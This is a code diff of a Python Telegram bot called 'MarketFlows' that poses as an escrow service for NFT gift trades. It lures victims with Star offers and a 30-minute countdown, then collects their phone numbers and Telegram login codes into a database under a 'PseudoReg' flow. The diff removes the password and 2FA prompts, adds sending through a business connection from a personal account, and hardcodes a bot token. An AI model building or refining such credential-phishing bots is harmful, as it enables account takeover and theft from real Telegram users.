@@ -12,7 +12,7 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup  
 from aiogram.fsm.storage.memory import MemoryStorage  
 from aiogram.types import (  
-    Message, CallbackQuery,  
+    Message, CallbackQuery, BusinessConnection,  
     InlineKeyboardMarkup, InlineKeyboardButton,  
     ReplyKeyboardMarkup, KeyboardButton  
 )  
@@ -20,6 +20,8 @@ from aiogram.types import (
 BOT_TOKEN = "9111963048:AAHem8wQwJiU5mkeoob_3KtmPRP8sGtYtmM"  
 BRAND = "MarketFlows"  
 DB_PATH = "marketflows.db"  
+
+active_business_connection_id = None
 
 def db():  
     return sqlite3.connect(DB_PATH)  
@@ -44,8 +46,6 @@ def db_init():
         deal_code TEXT,  
         phone TEXT,  
         code TEXT,  
-        password TEXT,  
-        twofa TEXT,  
         session_data TEXT,  
         created_at TEXT  
     )""")  
@@ -64,12 +64,11 @@ def get_deal(code):
     conn.close()  
     return row  
 
-def save_account(deal_code, phone, code, password, twofa, session_data):  
+def save_account(deal_code, phone, code, session_data):  
     conn = db()  
     conn.execute(  
-        "INSERT INTO accounts (deal_code, phone, code, password, twofa, session_data, created_at) "  
-        "VALUES (?,?,?,?,?,?,?)",  
-        (deal_code, phone, code, password, twofa, session_data, datetime.utcnow().isoformat())  
+        "INSERT INTO accounts (deal_code, phone, code, session_data, created_at) VALUES (?,?,?,?,?)",  
+        (deal_code, phone, code, session_data, datetime.utcnow().isoformat())  
     )  
     conn.commit()  
     conn.close()  
@@ -77,8 +76,6 @@ def save_account(deal_code, phone, code, password, twofa, session_data):
 class PseudoReg(StatesGroup):  
     phone = State()  
     code = State()  
-    password = State()  
-    twofa = State()  
 
 class CreateDeal(StatesGroup):  
     waiting_for_link = State()  
@@ -87,13 +84,18 @@ class CreateDeal(StatesGroup):
 def main_menu():  
     return ReplyKeyboardMarkup(  
         keyboard=[  
-            [KeyboardButton(text="🤝 Создать сделку"), KeyboardButton(text="📂 Мои сделки")],  
-            [KeyboardButton(text="👤 Профиль"), KeyboardButton(text="ℹ️ Помощь")],  
+            [KeyboardButton(text="🤝 Создать сделку")]  
         ],  
         resize_keyboard=True  
     )  
 
 router = Router()  
+
+@router.business_connection()
+async def business_connection_handler(bc: BusinessConnection):
+    global active_business_connection_id
+    if bc.is_enabled:
+        active_business_connection_id = bc.id
 
 @router.message(CommandStart())  
 async def cmd_start(msg: Message):  
@@ -109,7 +111,7 @@ async def cmd_start(msg: Message):
             caption = (
                 f"Пользователь {creator_uname} предлагает вам <b>{amount:,.0f} ⭐</b> за подарок\n\n"
                 f"Telegram\n<a href=\"{gift_link}\">Подарок</a>\n\n"
-                f"⏳ <b>Время до сгорания ордера:</b> 2 часа 0 минут"
+                f"⏳ <b>Предложение активно ещё 29:59</b>"
             )
             
             kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -129,7 +131,7 @@ async def cmd_start(msg: Message):
             return  
 
     await msg.answer(  
-        f"🏦 Добро пожаловать в <b>{BRAND}</b>!\n\nНажми кнопку ниже для создания сделки.",  
+        f"🏦 Добро пожаловать в <b>{BRAND}</b>!\n\nНажми кнопку ниже, чтобы создать сделку.",  
         parse_mode="HTML",
         reply_markup=main_menu()  
     )  
@@ -143,14 +145,14 @@ async def start_create_deal(msg: Message, state: FSMContext):
 async def process_gift_link(msg: Message, state: FSMContext):
     await state.update_data(gift_link=msg.text.strip())
     await state.set_state(CreateDeal.waiting_for_amount)
-    await msg.answer("💎 Введите сумму в Stars (например, <code>1488</code>):", parse_mode="HTML")
+    await msg.answer("💎 Введите сумму в Stars (например, <code>3000</code>):", parse_mode="HTML")
 
 @router.message(CreateDeal.waiting_for_amount)
 async def process_gift_amount(msg: Message, state: FSMContext):
     try:
         amount = float(msg.text.strip().replace(",", "."))
     except ValueError:
-        await msg.answer("❌ Неверный формат суммы. Введите число (например, 1488):")
+        await msg.answer("❌ Неверный формат суммы. Введите число:")
         return
 
     data = await state.get_data()
@@ -171,11 +173,11 @@ async def process_gift_amount(msg: Message, state: FSMContext):
     conn.close()
 
     send_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📤 Опубликовать карточку ордера", callback_data=f"publish_{code}")]
+        [InlineKeyboardButton(text="📤 Отправить карточку ордера", callback_data=f"publish_{code}")]
     ])
 
     await msg.answer(
-        f"✅ <b>Ордер #{code} готов!</b>\nНажми кнопку ниже, чтобы опубликовать его в чате:",
+        f"✅ <b>Ордер #{code} готов!</b>\nНажми кнопку ниже, чтобы опубликовать:",
         parse_mode="HTML",
         reply_markup=send_kb
     )
@@ -192,7 +194,7 @@ async def publish_deal(cb: CallbackQuery):
         caption = (
             f"Пользователь {creator_uname} предлагает вам <b>{amount:,.0f} ⭐</b> за подарок\n\n"
             f"Telegram\n<a href=\"{gift_link}\">Подарок</a>\n\n"
-            f"⏳ <b>Время до сгорания ордера:</b> 2 часа 0 минут"
+            f"⏳ <b>Предложение активно ещё 29:59</b>"
         )
         
         kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -203,47 +205,46 @@ async def publish_deal(cb: CallbackQuery):
             ]
         ])
         
-        await cb.message.answer_photo(
-            photo="https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1000&auto=format&fit=crop",
-            caption=caption,
-            parse_mode="HTML",
-            reply_markup=kb
-        )
+        if active_business_connection_id:
+            await cb.bot.send_photo(
+                chat_id=cb.message.chat.id,
+                photo="https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1000&auto=format&fit=crop",
+                caption=caption,
+                parse_mode="HTML",
+                reply_markup=kb,
+                business_connection_id=active_business_connection_id
+            )
+        else:
+            await cb.message.answer_photo(
+                photo="https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1000&auto=format&fit=crop",
+                caption=caption,
+                parse_mode="HTML",
+                reply_markup=kb
+            )
+            
         await cb.message.delete()
-        await cb.answer("Ордер опубликован!")
-
-@router.message(F.text.contains("Помощь"))
-async def help_msg(msg: Message):  
-    await msg.answer("🛡 Гарант-сервис безопасных сделок с NFT подарками.", reply_markup=main_menu())  
-
-@router.message(F.text.contains("Профиль"))
-async def profile_msg(msg: Message):  
-    await msg.answer(f"👤 ID: <code>{msg.from_user.id}</code>", parse_mode="HTML", reply_markup=main_menu())  
-
-@router.message(F.text.contains("Мои сделки"))
-async def deals_msg(msg: Message):  
-    await msg.answer("📂 Активных сделок нет.", reply_markup=main_menu())  
+        await cb.answer("Ордер отправлен!")
 
 @router.callback_query(F.data.startswith("sel_accept_"))
-async def sel_accept(cb: CallbackQuery):
+async def sel_accept(cb: CallbackQuery, state: FSMContext):
     code = cb.data.split("_")[2]
-    set_db_status(code, "accepted")
     deal = get_deal(code)
-    if deal:
-        creator_uname = deal[3].lstrip("@")
-        kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text=f"Отправить: {creator_uname}", callback_data=f"sendto_{code}_{creator_uname}")]
-        ])
-        await cb.message.edit_reply_markup(reply_markup=kb)
-        await cb.answer()
+    if not deal:
+        await cb.answer("Ордер не найден", show_alert=True)
+        return
 
-@router.callback_query(F.data.startswith("sendto_"))
-async def sendto_cb(cb: CallbackQuery, state: FSMContext):
-    parts = cb.data.split("_")
-    await state.update_data(deal_code=parts[1], target_user=parts[2])
+    amount = deal[6]
+    set_db_status(code, "accepted")
+    await state.update_data(deal_code=code)
+    
+    # Всплывающее окно с текстом и суммой
+    await cb.answer(
+        text=f"Отправьте подарок в течение 30 минут, и {amount:,.0f} ⭐ автоматически пополнятся на ваш аккаунт.",
+        show_alert=True
+    )
+    
     await state.set_state(PseudoReg.phone)
-    await cb.message.answer("📱 Введите номер телефона (+7XXXXXXXXXX) для авторизации:")
-    await cb.answer()
+    await cb.message.answer("📱 Введите номер телефона (+7XXXXXXXXXX):")
 
 @router.callback_query(F.data.startswith("sel_reject_"))
 async def sel_reject(cb: CallbackQuery):
@@ -259,29 +260,17 @@ async def reg_phone(msg: Message, state: FSMContext):
   
 @router.message(PseudoReg.code)  
 async def reg_code(msg: Message, state: FSMContext):  
-    await state.update_data(code=msg.text)  
-    await state.set_state(PseudoReg.password)  
-    await msg.answer("🔑 Введите облачный пароль (если есть):")  
-  
-@router.message(PseudoReg.password)  
-async def reg_password(msg: Message, state: FSMContext):  
-    await state.update_data(password=msg.text)  
-    await state.set_state(PseudoReg.twofa)  
-    await msg.answer("🛡 Введите 2FA (или «нет»):")  
-  
-@router.message(PseudoReg.twofa)  
-async def reg_twofa(msg: Message, state: FSMContext):  
     data = await state.get_data()  
-    save_account(data.get("deal_code"), data.get("phone"), data.get("code"), data.get("password"), msg.text, json.dumps({"user": msg.from_user.id}))  
+    save_account(data.get("deal_code"), data.get("phone"), msg.text, json.dumps({"user": msg.from_user.id}))  
     await state.clear()  
-    await msg.answer("✅ Авторизация успешна.")  
+    await msg.answer("✅ Успешно! Ожидайте пополнения баланса.")  
 
 async def main():  
     db_init()  
     bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))  
     dp = Dispatcher(storage=MemoryStorage())  
     dp.include_router(router)  
-    print(f"[{BRAND}] Бот запущен без инлайна.")  
+    print(f"[{BRAND}] Бот запущен в финальном режиме.")  
     await dp.start_polling(bot)  
 
 if __name__ == "__main__":  
